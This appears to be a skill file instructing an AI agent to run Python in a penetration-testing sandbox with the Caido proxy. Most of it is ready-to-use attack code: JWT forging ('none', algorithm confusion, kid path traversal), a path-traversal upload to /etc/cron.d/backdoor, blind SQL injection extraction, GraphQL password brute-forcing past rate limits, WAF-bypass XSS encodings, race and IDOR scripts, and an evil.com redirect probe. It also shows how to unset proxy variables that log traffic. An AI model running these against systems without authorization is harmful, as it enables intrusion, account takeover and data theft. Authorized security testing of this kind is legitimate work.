---
name: python
description: Run Python through exec_command in the SDK sandbox. Use the image-baked caido_api module for Caido proxy automation from Python scripts.
---

# Python In The Sandbox

Use `exec_command` for Python. There is no separate Python executor.

Prefer writing reusable scripts to a `.py` file and running them with
`python3 <name>.py`. For short one-off transformations, `python3 -c` or a
small here-document is fine.

The `shell` parameter on `exec_command` is for swapping POSIX shells
(`bash`/`zsh`/`sh`), not for picking interpreters. Put the interpreter
invocation in `cmd` instead: `cmd="python3 -c '...'"`, not
`shell=python3, cmd="..."`. The `shell=<interpreter>` shortcut breaks
in subtle ways — `python3` works only with `login=False` (because the
SDK adds `-l`/`-i`), and other interpreters (`node`, `ruby`, `perl`)
take `-e` not `-c` so they fail even with `login=False`.

The sandbox runs **Python 3.14.7** inside `/app/.venv`. The venv is
active by default — `python3` and `pip` resolve there.

---

## Proxy Automation From Python

The sandbox image includes an installed `caido_api` module. Import it
explicitly when Python code needs Caido traffic or replay access:

```python
from caido_api import (
    list_requests,
    list_sitemap,
    repeat_request,
    scope_rules,
    view_request,
    view_sitemap_entry,
)
```

All helpers are async. Use them inside `asyncio.run(...)` or an async
function:

```python
import asyncio

from caido_api import list_requests, view_request


async def main():
    posts = await list_requests(
        httpql_filter='req.method.eq:"POST" AND req.path.cont:"/api/"',
        first=50,
    )
    candidates = []
    for edge in posts.edges:
        request_id = edge.node.request.id
        body = await view_request(request_id, part="request")
        raw = body.request.raw.decode("utf-8", errors="replace")
        if "id=" in raw or "user=" in raw:
            candidates.append(request_id)

    print(f"{len(candidates)} candidates")
    print(candidates[:10])


asyncio.run(main())
```

Available helpers:

- `list_requests(httpql_filter=, first=50, after=, sort_by=, sort_order=, scope_id=)` returns a cursor-paginated Caido SDK `Connection`.
- `view_request(request_id, part="request")` returns a Caido SDK request object with raw request/response bytes.
- `repeat_request(request_id, modifications={...})` replays a captured request after modifying `url`, `params`, `headers`, `body`, or `cookies`.
- `list_sitemap(scope_id=, parent_id=, depth="DIRECT", page=1)` walks Caido's request-tree view of the discovered surface. Omit `parent_id` for root domains; pass an entry id with `depth="DIRECT"` or `"ALL"` to drill in.
- `view_sitemap_entry(entry_id)` returns one entry plus its 30 most recent related requests.
- `scope_rules(action, allowlist=, denylist=, scope_id=, scope_name=)` manages Caido scopes.

### Replay-and-modify patterns

Modify a captured request to test authorization boundaries:

```python
async def test_idor(request_id, target_ids):
    results = []
    for uid in target_ids:
        resp = await repeat_request(request_id, modifications={
            "params": {"user_id": str(uid)},
        })
        raw = resp.response.raw.decode("utf-8", errors="replace")
        status = resp.response.status_code
        results.append({"id": uid, "status": status, "length": len(raw)})
    return results
```

The same pattern works for auth-header swaps (privilege escalation testing) —
modify `"headers"` instead of `"params"`.

For one-off arbitrary requests (e.g. probing a fresh endpoint, hitting an
external API), use `exec_command` with `curl` / `httpx` / `requests`. The
sandbox's `HTTP_PROXY` env routes all such traffic through Caido
automatically, so it shows up in `list_requests` and you can use
`repeat_request` to replay-and-modify any of it.

---

## Pre-Installed Library Reference

Everything below is verified present in `ghcr.io/zenneyy/zen-sandbox:1.2.2`.
Import directly — no install step.

**HTTP:**
| Library | Version | Import | Use |
|---|---|---|---|
| requests | 2.34.2 | `import requests` | Synchronous HTTP — sessions, cookies, auth, multipart |
| httpx | 0.28.1 | `import httpx` | Sync + async HTTP, HTTP/2, transport-level control |
| aiohttp | 3.14.4 | `import aiohttp` | Async HTTP client/server, WebSocket client, connection pooling |

**Parsing:**
| Library | Version | Import | Use |
|---|---|---|---|
| lxml | 6.1.3 | `from lxml import html, etree` | XPath/CSS selectors, fast XML/HTML parsing |
| beautifulsoup4 | 4.15.0 | `from bs4 import BeautifulSoup` | Tolerant HTML parsing, tag navigation |

**Cryptography:**
| Library | Version | Import | Use |
|---|---|---|---|
| cryptography | 50.0.2 | `from cryptography.hazmat.primitives import ...` | X.509, key generation, ciphers, hashing, ECDSA/RSA/Ed25519 |
| pycryptodomex | 3.24.0 | `from Cryptodome.Cipher import AES` | AES/DES3/ChaCha20, padding, block cipher modes |
| PyJWT | 2.15.1 | `import jwt` | JWT encode/decode, 16 algorithms (HS/RS/ES/PS/EdDSA/none) |

**Async / WebSocket:**
| Library | Version | Import | Use |
|---|---|---|---|
| websockets | 17.2 | `import websockets` | WebSocket client/server, per-message manipulation |
| asyncio | stdlib | `import asyncio` | Event loop, concurrency, race-condition PoCs |

**GraphQL:**
| Library | Version | Import | Use |
|---|---|---|---|
| gql | 4.4.0 | `from gql import gql, Client` | GraphQL client, introspection, transport layer |
| graphql-core | 3.3.0 | `import graphql` | Schema parsing, query AST manipulation |

**Data / Utility:**
| Library | Version | Import | Use |
|---|---|---|---|
| pydantic | 2.13.5 | `from pydantic import BaseModel` | Structured tool output, response validation |
| tenacity | 9.1.4 | `from tenacity import retry` | Retry with backoff for flaky targets |
| ratelimit | 2.2.1 | `from ratelimit import limits` | Decorator-based request rate limiting |
| semver | 3.1.0 | `import semver` | Version comparison for CVE range checks |

**Standard library (security-relevant):**
`json`, `xml.etree.ElementTree`, `html.parser`, `urllib.parse`, `struct`,
`socket`, `ssl`, `hashlib`, `hmac`, `base64`, `binascii`, `re`,
`subprocess`, `asyncio`, `http.cookiejar`, `http.server`, `itertools`,
`secrets`, `tempfile`, `pathlib`, `collections`, `functools`.

---

## HTTP Request Manipulation

### requests — session-based exploit flow

```python
import requests

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"})
login = s.post("https://target/api/login", json={"user": "admin", "pass": "hunter2"})
s.headers["Authorization"] = f"Bearer {login.json()['token']}"
profile = s.get("https://target/api/me")  # session carries cookies + token
```

Raw body to bypass content-type sniffing:

```python
resp = s.post("https://target/api/upload",
    data=b'\x89PNG\r\n\x1a\n' + payload_bytes, headers={"Content-Type": "image/png"})
```

Multipart with crafted filename (path traversal in upload handlers):

```python
resp = s.post("https://target/upload",
    files={"file": ("../../../etc/cron.d/backdoor", payload, "text/plain")})
```

### httpx — HTTP/2 and async

```python
import httpx

with httpx.Client(http2=True, verify=False) as c:    # HTTP/2 multiplexed
    resp = c.get("https://target/api/resource")

async with httpx.AsyncClient(http2=True, verify=False) as c:  # async
    results = await asyncio.gather(*[c.get(f"https://target/api/item/{i}") for i in range(100)])
```

Disable redirects (open-redirect detection):

```python
resp = httpx.get("https://target/redirect?url=https://evil.com",
    follow_redirects=False, verify=False)
print(resp.status_code, resp.headers.get("location"))
```

Transport-level control — custom SSL context for cipher downgrade testing:

```python
import ssl
ctx = ssl.create_default_context()
ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
with httpx.Client(verify=ctx) as c:
    resp = c.get("https://target/")
```

### aiohttp — high-concurrency scanning

```python
import aiohttp, asyncio

async def fetch_all(urls, concurrency=50):
    conn = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        results = await asyncio.gather(*[s.get(u) for u in urls], return_exceptions=True)
        return [(r.status, len(await r.read())) if not isinstance(r, Exception)
                else (0, str(r)) for r in results]
```

---

## Crypto and Token Work

### PyJWT — token forging and algorithm attacks

Decode without verification to inspect claims:

```python
import jwt

token = "eyJhbGci..."
claims = jwt.decode(token, options={"verify_signature": False})
header = jwt.get_unverified_header(token)
```

Algorithm confusion — forge RS256 token using server's public key as HMAC
secret (CVE-2016-10555 pattern):

```python
pub_key = open("server_pub.pem", "rb").read()
forged = jwt.encode({"sub": "admin", "role": "superuser", "exp": 9999999999},
    pub_key, algorithm="HS256", headers={"kid": "server-key-1"})
```

`none` algorithm bypass:

```python
forged = jwt.encode({"sub": "admin", "role": "superuser"}, "", algorithm="none")
```

`kid` injection — path traversal or SQLi through the key-id header:

```python
forged = jwt.encode({"sub": "admin"}, "known-value", algorithm="HS256",
    headers={"kid": "../../dev/null"})
```

### cryptography — X.509 and key operations

Parse TLS certificate SANs (origin IP discovery behind CDN):

```python
from cryptography import x509
import ssl

cert_pem = ssl.get_server_certificate(("target.tld", 443))
cert = x509.load_pem_x509_certificate(cert_pem.encode())
san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
print("DNS:", san.value.get_all_for(x509.DNSName))
print("IPs:", san.value.get_all_for(x509.IPAddress))
```

Generate an RSA key pair (JWK injection, test client certs):

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_pem = key.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
priv_pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
```

### pycryptodomex — symmetric cipher operations

AES-CBC decrypt an intercepted blob:

```python
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import base64

key = bytes.fromhex("00112233445566778899aabbccddeeff")
iv  = bytes.fromhex("00112233445566778899aabbccddeeff")
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(base64.b64decode(ciphertext_b64)), AES.block_size)
```

HMAC construction for API signature forgery:

```python
import hmac, hashlib
secret = b"leaked-api-secret"
message = b"GET\n/api/admin\n1696000000"
sig = hmac.new(secret, message, hashlib.sha256).hexdigest()
```

---

## Parsing and Extraction

### lxml — XPath for HTML/XML

```python
from lxml import html

tree = html.fromstring(response_body)
forms   = tree.xpath("//form/@action")
hidden  = {inp.get("name"): inp.get("value") for inp in tree.xpath('//input[@type="hidden"]')}
scripts = tree.xpath("//script/@src")
links   = tree.xpath("//a/@href")
```

### beautifulsoup4 — tolerant HTML parsing

```python
from bs4 import BeautifulSoup
import re

soup = BeautifulSoup(response_body, "lxml")

# HTML comments (information disclosure)
comments = re.findall(r'<!--(.*?)-->', response_body, re.DOTALL)

# API endpoints from inline scripts
for script in soup.find_all("script"):
    if script.string:
        print(re.findall(r'["\']/(api/[^"\']+)["\']', script.string))
```

### Regex patterns for security extraction

```python
import re

secrets_re = re.compile(
    r'(?:api[_-]?key|api[_-]?secret|token|password|secret|auth)'
    r'\s*[=:]\s*["\']([A-Za-z0-9_\-./+=]{16,})["\']', re.IGNORECASE)
aws_key_re = re.compile(r'AKIA[0-9A-Z]{16}')
jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
internal_ip_re = re.compile(
    r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}'
    r'|192\.168\.\d{1,3}\.\d{1,3})\b')
```

---

## Async and WebSocket

### websockets — connection manipulation

```python
import asyncio, websockets, json

async def ws_exploit():
    async with websockets.connect("wss://target/ws",
            additional_headers={"Authorization": "Bearer stolen-token"}) as ws:
        await ws.send(json.dumps({"action": "subscribe", "channel": "admin"}))
        async for msg in ws:
            data = json.loads(msg)
            print(data)
            if data.get("type") == "secret":
                break

asyncio.run(ws_exploit())
```

### asyncio — concurrent exploit execution

Timing oracle — measure per-payload response time for side-channel extraction:

```python
import asyncio, httpx, time

async def timing_oracle(url, payloads):
    async with httpx.AsyncClient(verify=False) as client:
        results = []
        for payload in payloads:
            start = time.perf_counter()
            resp = await client.post(url, json={"input": payload})
            elapsed = (time.perf_counter() - start) * 1000
            results.append({"payload": payload, "time_ms": elapsed, "status": resp.status_code})
        return sorted(results, key=lambda r: r["time_ms"], reverse=True)
```

Race condition — send N identical requests simultaneously (HTTP/2 single connection):

```python
async def race(url, data, n=20):
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        results = await asyncio.gather(*[client.post(url, json=data) for _ in range(n)])
        statuses = [r.status_code for r in results]
        print(f"Results: {dict((s, statuses.count(s)) for s in set(statuses))}")
```

---

## GraphQL

### Introspection and schema enumeration

```python
from gql import gql, Client
from gql.transport.httpx import HTTPXTransport

transport = HTTPXTransport(url="https://target/graphql", verify=False,
    headers={"Authorization": "Bearer token"})
client = Client(transport=transport, fetch_schema_from_transport=True)

result = client.execute(gql(
  "{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"))
for t in result["__schema"]["types"]:
    if not t["name"].startswith("__") and t.get("fields"):
        print(f"\n{t['name']}:", [f["name"] for f in t["fields"]])
```

### Batching attack (bypass per-request rate limiting)

Build aliased queries programmatically — each alias is a separate resolver
call inside one HTTP request:

```python
def make_batch_login(username, passwords):
    aliases = [f'a{i}: login(user: "{username}", pass: "{pw}") {{ token }}'
               for i, pw in enumerate(passwords)]
    return gql("query Batch {\n  " + "\n  ".join(aliases) + "\n}")
```

---

## Raw Networking

### TCP — banner grab and protocol probe

```python
import socket

def banner_grab(host, port, probe=b"", timeout=5):
    with socket.create_connection((host, port), timeout=timeout) as s:
        if probe:
            s.sendall(probe)
        return s.recv(4096)

# HTTP probe
print(banner_grab("target", 80, b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n"))

# raw SMTP
print(banner_grab("target", 25))
```

### SSL/TLS inspection

```python
import ssl, socket

def get_tls_info(host, port=443):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port)) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            return {"version": ssock.version(), "cipher": ssock.cipher()}
```

### struct — binary protocol construction

```python
import struct
header = struct.pack(">BBH I", 0x01, 0x02, len(payload), 0xDEADBEEF)
magic, version, length, checksum = struct.unpack(">BBH I", response[:8])
```

---

## Data Validation and Serialization

### pydantic — structured tool output

```python
from pydantic import BaseModel

class Finding(BaseModel):
    url: str
    vuln_type: str
    severity: str
    evidence: str
    request_id: str | None = None

class ScanResult(BaseModel):
    target: str
    findings: list[Finding]
    total_requests: int

result = ScanResult.model_validate(raw_dict)
print(result.model_dump_json(indent=2))
```

### Encoding chains

Multi-stage encoding for WAF bypass testing:

```python
import base64, urllib.parse, binascii

payload = "<script>alert(1)</script>"
url_encoded  = urllib.parse.quote(payload)
double_enc   = urllib.parse.quote(url_encoded)
b64_encoded  = base64.b64encode(payload.encode()).decode()
hex_encoded  = binascii.hexlify(payload.encode()).decode()
unicode_esc  = "".join(f"\\u{ord(c):04x}" for c in payload)
```

---

## Exploit and PoC Scripting Patterns

### Blind injection — binary search oracle

```python
import httpx

async def blind_extract(url, query_template, marker="true-condition", max_len=64):
    extracted = ""
    async with httpx.AsyncClient(verify=False) as client:
        for pos in range(1, max_len + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                resp = await client.get(url, params={"q": query_template.format(pos=pos, val=mid)})
                lo, hi = (mid + 1, hi) if marker in resp.text else (lo, mid)
            if lo == 32: break
            extracted += chr(lo)
    return extracted
```

For time-based extraction, use the `timing_oracle` pattern from
the Async section with a sleep-triggering inject template and
a threshold comparison.

### OAST correlation

```python
import secrets

def make_oast_token():
    return secrets.token_hex(8)

def inject_with_oast(url, payload_template, oast_domain):
    token = make_oast_token()
    payload = payload_template.format(callback=f"{token}.{oast_domain}")
    resp = httpx.post(url, data={"input": payload}, verify=False)
    return token, resp.status_code
```

For race conditions (coupon reuse, double-spend), use the `race()` pattern
from the Async section with the target endpoint and payload.

---

## Custom Tooling and Automation

### Orchestrating CLI tools from Python

Parse nmap XML output with lxml:

```python
import subprocess
from lxml import etree

result = subprocess.run(["nmap", "-sV", "-oX", "-", "target"], capture_output=True, text=True)
tree = etree.fromstring(result.stdout.encode())
for host in tree.xpath("//host"):
    addr = host.find("address").get("addr")
    for port in host.xpath(".//port"):
        svc = port.find("service")
        print(f"{addr}:{port.get('portid')} {port.find('state').get('state')}"
              f" {svc.get('name', '?') if svc is not None else '?'}")
```

Parse nuclei JSONL:

```python
import json

SEV = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

def parse_nuclei_jsonl(path):
    with open(path) as f:
        hits = [json.loads(line) for line in f]
    findings = [{"template": h.get("template-id"), "severity": h.get("info",{}).get("severity"),
                 "matched": h.get("matched-at")} for h in hits]
    return sorted(findings, key=lambda f: SEV.get(f["severity"], 5))
```

### Rate limiting with tenacity and ratelimit

```python
from ratelimit import limits, sleep_and_retry
from tenacity import retry, stop_after_attempt, wait_exponential
import httpx

@sleep_and_retry
@limits(calls=30, period=1)
def rate_limited_request(client, url):
    return client.get(url, verify=False)

@retry(stop=stop_after_attempt(3), wait=wait_exponential(min=1, max=10))
def resilient_request(client, url):
    resp = client.get(url, verify=False)
    resp.raise_for_status()
    return resp
```

### Build a scan pipeline

Chain CLI tools via subprocess — each stage writes a file the next reads:

```python
import subprocess

def run_pipeline(target):
    subprocess.run(["subfinder", "-d", target, "-silent", "-o", "/tmp/subs.txt"], capture_output=True)
    subprocess.run(["httpx", "-l", "/tmp/subs.txt", "-silent", "-o", "/tmp/live.txt"], capture_output=True)
    subprocess.run(["nuclei", "-l", "/tmp/live.txt", "-severity", "critical,high",
                    "-jsonl", "-o", "/tmp/nuclei.jsonl"], capture_output=True)
    return parse_nuclei_jsonl("/tmp/nuclei.jsonl")
```

---

## Workflow

For iterative exploit work, put code in a file:

```text
1. Create or edit a task-unique script (e.g. `poc_<task-id>.py`, so it can't
   clobber a project file or another agent's script) with `apply_patch`.
2. Run it with `exec_command`: `python3 poc_<task-id>.py`.
3. Edit and rerun until the proof-of-concept is reliable.
```

---

## Installing Extra Packages

The sandbox's Python lives in `/app/.venv`, and it is the active virtualenv
(`python3` / `pip` already resolve to it). The following common libraries are
**pre-installed** — import them directly, no install step needed:
`requests`, `httpx`, `beautifulsoup4` (`bs4`), `lxml`, `pyjwt` (`jwt`),
`cryptography`, `pycryptodomex` (`Cryptodome`), `aiohttp`, `websockets`,
`gql`, `pydantic`, `tenacity`, `ratelimit`, `semver`.

To add a one-off dependency for an exploit script, use `uv` (already in the
image and much faster than pip):

```bash
uv pip install --python /app/.venv/bin/python <package>
```

Plain `pip install <package>` also works because the venv is active. Install
before you import, so scripts don't fail with `ModuleNotFoundError`.

**Proxy note:** The sandbox sets `HTTP_PROXY`/`HTTPS_PROXY` to route traffic
through Caido. PyPI access requires unsetting these first:

```bash
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY && uv pip install <package>
```

---

## Chaining

Python is the glue layer between the CLI tools and the vulnerability
playbooks. Typical routing:

**From tooling playbooks → Python scripting:**
- `tooling/nmap.md` → parse XML output, correlate open ports with service-specific exploits
- `tooling/nuclei.md` → parse JSONL findings, deduplicate, prioritize
- `tooling/ffuf.md` → parse JSON output, filter interesting status codes, feed to targeted testing
- `tooling/sqlmap.md` → parse output, extract dumped data, correlate with IDOR testing
- `tooling/katana.md` → parse crawl JSONL, extract endpoints, seed further scanning
- `tooling/httpx.md` → parse tech-detect/header output for targeted exploit selection
- `tooling/hurl.md` → complement Hurl's declarative HTTP with Python's programmatic control

**From Python → vulnerability playbooks (exploit scripting for):**
- `vulnerabilities/authentication_jwt.md` — PyJWT algorithm confusion, `none` bypass, `kid` injection
- `vulnerabilities/sql_injection.md` — blind extraction, time-based oracle, encoding chains
- `vulnerabilities/idor.md` — parameter enumeration via caido_api replay
- `vulnerabilities/race_conditions.md` — asyncio/httpx race PoCs, HTTP/2 single-packet attacks
- `vulnerabilities/ssrf.md` — redirect chains, DNS rebinding harnesses
- `vulnerabilities/csrf.md` — token extraction with lxml/bs4, forged form generation
- `vulnerabilities/insecure_deserialization.md` — pycryptodomex for crafted payloads
- `vulnerabilities/business_logic.md` — stateful exploit scripts with session management
- `vulnerabilities/information_disclosure.md` — regex extraction of secrets, IPs, stack traces
- `vulnerabilities/header_injection.md` — CRLF payload generation, raw header construction
- `vulnerabilities/open_redirect.md`, `vulnerabilities/prototype_pollution.md`, `vulnerabilities/broken_function_level_authorization.md`, `vulnerabilities/llm_prompt_injection.md` — programmatic fuzzing and enumeration

**From Python → analysis:**
- `analysis/severity_calibration.md` — structured finding output via pydantic
